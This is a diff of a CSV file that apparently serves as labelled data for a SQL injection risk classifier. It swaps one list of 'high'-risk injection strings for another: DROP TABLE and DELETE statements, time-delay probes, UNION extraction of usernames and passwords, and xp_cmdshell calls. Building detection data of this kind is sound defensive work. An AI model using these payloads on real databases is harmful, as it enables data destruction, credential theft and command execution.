@@ -1,101 +1,101 @@
-query,risk,score
-' OR 1=1; DROP TABLE temp; --,high,70
-' OR SLEEP(5) AND '1'='1,high,70
-' OR 1=1; DROP TABLE temp; --,high,70
-"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
-'; WAITFOR DELAY '0:0:5'--,high,70
-' OR 1=1; DROP TABLE temp; --,high,70
-"'; EXEC sp_configure 'show advanced options', 1; --",high,70
-' OR SLEEP(5) AND '1'='1,high,70
-'; DROP PROCEDURE admin_login--,high,70
-"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
-'; DELETE FROM users; /**/,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
-'; WAITFOR DELAY '0:0:5'--,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
-'; ALTER TABLE users ADD column VARCHAR(255),high,70
-"'; EXEC sp_configure 'show advanced options', 1; --",high,70
-' OR SLEEP(5) AND '1'='1,high,70
-' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
-"' UNION ALL SELECT username, password FROM users",high,70
-'; WAITFOR DELAY '0:0:5'--,high,70
-' OR 1=1; DROP TABLE temp; --,high,70
-' OR 1=1; DROP TABLE temp; --,high,70
-'; ALTER TABLE users ADD column VARCHAR(255),high,70
-'; WAITFOR DELAY '0:0:5'--,high,70
-"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
-' OR SLEEP(5) AND '1'='1,high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
-' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
-"'; EXEC sp_configure 'show advanced options', 1; --",high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
-"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
-' OR SLEEP(5) AND '1'='1 -- ,high,70
-'; DELETE FROM users; /**/ -- ,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
-' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
-'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
-' OR 1=1; DROP TABLE temp; -- -- ,high,70
-'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
-'; SELECT pg_sleep(5); -- -- ,high,70
-'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
-'; DELETE FROM users; /**/ -- ,high,70
-'; DELETE FROM users; /**/ -- ,high,70
-'; DELETE FROM users; /**/ -- ,high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
-"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
-' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
-' OR 1=1; DROP TABLE temp; -- -- ,high,70
-'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
-'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
-'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
-"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
-' OR SLEEP(5) AND '1'='1 -- ,high,70
-'; WAITFOR DELAY '0:0:5'-- -- ,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
-' OR SLEEP(5) AND '1'='1 -- ,high,70
-'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
-' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
-'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
-'; SELECT pg_sleep(5); -- # ,high,70
-'; ALTER TABLE users ADD column VARCHAR(255) # ,high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- # ",high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- # ",high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- # ",high,70
-'; SELECT pg_sleep(5); -- # ,high,70
-'; WAITFOR DELAY '0:0:5'-- # ,high,70
-'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # ,high,70
-'; DELETE FROM users; /**/ # ,high,70
-' OR 1=1; DROP TABLE temp; -- # ,high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # ,high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- # ",high,70
-'; SELECT pg_sleep(5); -- # ,high,70
-' OR SLEEP(5) AND '1'='1 # ,high,70
-"' UNION ALL SELECT username, password FROM users # ",high,70
-' OR SLEEP(5) AND '1'='1 # ,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # ",high,70
-'; SELECT pg_sleep(5); -- # ,high,70
-'; WAITFOR DELAY '0:0:5'-- # ,high,70
-"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # ",high,70
-'; DROP PROCEDURE admin_login-- # ,high,70
-"'; EXEC sp_configure 'show advanced options', 1; -- # ",high,70
-' OR SLEEP(5) AND '1'='1 # ,high,70
-"' UNION ALL SELECT username, password FROM users # ",high,70
-' OR SLEEP(5) AND '1'='1 # ,high,70
-'; DROP PROCEDURE admin_login-- # ,high,70
-"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # ",high,70
-'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # ,high,70
-' OR SLEEP(5) AND '1'='1 # ,high,70
-'; DROP PROCEDURE admin_login-- # ,high,70
-'; DELETE FROM users; /**/ # ,high,70
-'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # ,high,70
-'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # ,high,70
-' OR 1=1; INSERT INTO logs VALUES('hack') # ,high,70
+query,risk
+'; WAITFOR DELAY '0:0:5' --,high
+'; INSERT INTO logs VALUES('hack') --,high
+'; DROP TABLE temp,high
+'; WAITFOR DELAY '0:0:5' --,high
+'; INSERT INTO logs VALUES('hack') --,high
+'; ALTER TABLE users ADD col --,high
+"'; EXEC sp_configure 'options', 1 --",high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+'; DELETE FROM users --,high
+'; DROP DATABASE temp --,high
+'; INSERT INTO logs VALUES('hack') --,high
+'; ALTER TABLE users ADD col --,high
+' OR @@version,high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+'; UPDATE users SET pass='hack' --,high
+' OR @@version,high
+'; DROP TABLE temp --,high
+'; WAITFOR DELAY '0:0:5' --,high
+'; ALTER TABLE users ADD col --,high
+'; DROP TABLE temp,high
+'; SELECT SLEEP(5) --,high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+' OR 1=1; DROP TABLE users --,high
+"'; EXEC sp_configure 'options', 1 --",high
+'; DROP TABLE temp --,high
+'; SELECT SLEEP(5) --,high
+"'; EXEC sp_configure 'options', 1 --",high
+'; DROP TABLE temp,high
+' OR @@version,high
+'; UPDATE users SET pass='hack' --,high
+'; DROP DATABASE temp --,high
+'; INSERT INTO logs VALUES('hack') --,high
+'; SELECT SLEEP(5) --,high
+'; EXEC master..xp_cmdshell 'ping' --,high
+'; INSERT INTO logs VALUES('hack') --,high
+'; DROP DATABASE temp --,high
+'; DROP TABLE temp --,high
+'; DROP TABLE temp --,high
+'; DROP TABLE temp --,high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+' OR @@version,high
+'; DROP PROCEDURE admin_login --,high
+' OR @@version,high
+'; DROP DATABASE temp --,high
+'; WAITFOR DELAY '0:0:5' --,high
+'; UPDATE users SET pass='hack' --,high
+'; EXEC master..xp_cmdshell 'ping' --,high
+'; ALTER TABLE users ADD col --,high
+'; DROP TABLE temp,high
+'; DROP PROCEDURE admin_login --,high
+'; ALTER TABLE users ADD col --,high
+'; ALTER TABLE users ADD col --,high
+'; ALTER TABLE users ADD col --,high
+'; INSERT INTO logs VALUES('hack') --,high
+"'; EXEC sp_configure 'options', 1 --",high
+'; SELECT SLEEP(5) --,high
+'; DROP PROCEDURE admin_login --,high
+'; DROP DATABASE temp --,high
+'; DROP DATABASE temp --,high
+'; DROP DATABASE temp --,high
+'; DROP TABLE temp --,high
+' OR @@version,high
+' OR @@version,high
+'; DROP TABLE temp,high
+'; EXEC master..xp_cmdshell 'ping' --,high
+' UNION SELECT @@version --,high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+'; DROP PROCEDURE admin_login --,high
+"'; SELECT BENCHMARK(10000,MD5('x')) --",high
+'; DROP PROCEDURE admin_login --,high
+'; WAITFOR DELAY '0:0:5' --,high
+'; DROP TABLE temp,high
+"'; EXEC sp_configure 'options', 1 --",high
+' UNION SELECT @@version --,high
+' OR 1=1; DROP TABLE users --,high
+'; INSERT INTO logs VALUES('hack') --,high
+'; DROP DATABASE temp --,high
+'; WAITFOR DELAY '0:0:5' --,high
+'; UPDATE users SET pass='hack' --,high
+'; DROP PROCEDURE admin_login --,high
+' OR 1=1; DROP TABLE users --,high
+' OR 1=1; DROP TABLE users --,high
+'; DROP TABLE temp,high
+'; DELETE FROM users --,high
+'; SELECT PG_SLEEP(5) --,high
+' UNION SELECT @@version --,high
+'; DROP TABLE temp,high
+'; DROP PROCEDURE admin_login --,high
+'; WAITFOR DELAY '0:0:5' --,high
+' OR @@version,high
+"'; EXEC sp_configure 'options', 1 --",high
+'; DROP TABLE temp,high
+'; DROP DATABASE temp --,high
+'; DROP TABLE temp --,high
+'; DROP DATABASE temp --,high
+' OR 1=1; DROP TABLE users --,high
+'; SELECT SLEEP(5) --,high
+'; DROP DATABASE temp --,high
+'; UPDATE users SET pass='hack' --,high
